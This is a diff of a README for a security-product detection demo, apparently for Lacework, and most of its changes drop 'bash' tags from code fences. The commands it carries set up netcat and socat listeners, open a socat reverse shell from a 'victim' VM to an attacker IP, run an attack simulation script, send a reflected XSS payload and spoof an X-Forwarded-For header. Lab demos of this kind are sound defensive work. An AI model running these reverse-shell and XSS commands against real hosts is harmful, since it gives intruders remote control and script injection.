@@ -38,14 +38,14 @@ Note: The above are intended for Lacework to detect these VM "Internet Exposure"
 ## 🎯 Victim VM Setup
 
 1. **Install dependencies**
-   ```bash
+   ```
    sudo apt update
    sudo apt install python3 python3-pip -y
    pip3 install flask
    ```
 
 2. **Set up the attack simulation script**
-   ```bash
+   ```
    chmod +x demo_simulator/lw_attack_sim.sh
    ```
 
@@ -61,7 +61,7 @@ Note: The above are intended for Lacework to detect these VM "Internet Exposure"
    ```
 
 5. **Run the Flask application**
-   ```bash
+   ```
    python3 app.py
    ```
 6. **Deploy Lacework Agent**
@@ -75,25 +75,27 @@ Note: The above are intended for Lacework to detect these VM "Internet Exposure"
 
 1. **Create a persistent socket listener on Terminal 1 or screen 1:**
 
-```bash
+```
 nc -k -l 3333 &
 ```
 
 2. **Create a new socat tcp listener on tcp 5555**
 
-```bash
+```
 socat file:`tty`,raw,echo=0 tcp-listen:5555
 ```
  
 3. **Optionally run traffic simulation with k6 on Terminal 2 or screen 2:**
-```bash
+
+```
 sudo docker run --rm -v $(pwd):/scripts grafana/k6 run /scripts/k6.js
 ```
 
 ### On the Victim VM
 
 1. **Intiate an interactive Reverse Shell***
-```bash
+
+```
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:172.31.30.103:5555
 ```
 ---
@@ -104,7 +106,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:172.31.30.103:5555
 
 1. **Using the establisehd Reverse Shell Connection, Run the attack simulation script***
 
-```bash
+```
 ./demo_simulator/lw_attack_sim.sh
 ```
 
@@ -129,6 +131,7 @@ Test for reflected XSS using the greet endpoint:
 - [Greet](http://<victim_IP>:5000/greet)
 
 **Example:**
+
 ```
 http://<victim_IP>:5000/greet?name=<script>alert('GotYou :)')</script>
 ```
@@ -142,7 +145,8 @@ Test client IP extraction:
 - [Client IP](http://<victim_IP>:5000/client-ip)
 
 **Spoof IP via curl:**
-```bash
+
+```
 curl -H "X-Forwarded-For: 1.2.3.4" http://<victim_IP>:5000/client-ip
 ```
 
@@ -173,11 +177,12 @@ Happy testing — use responsibly in isolated environments.
 
 ***On Attacker VM***
 
-```bash
+```
 lsof -i -n -P | grep nc | awk '{print $2}' | sort -u | xargs -r kill -9
 ```
 
 ***On Victim VM***
-```bash
+
+```
 lsof -i -n -P | grep socat | awk '{print $2}' | sort -u | xargs -r kill -9
 ```
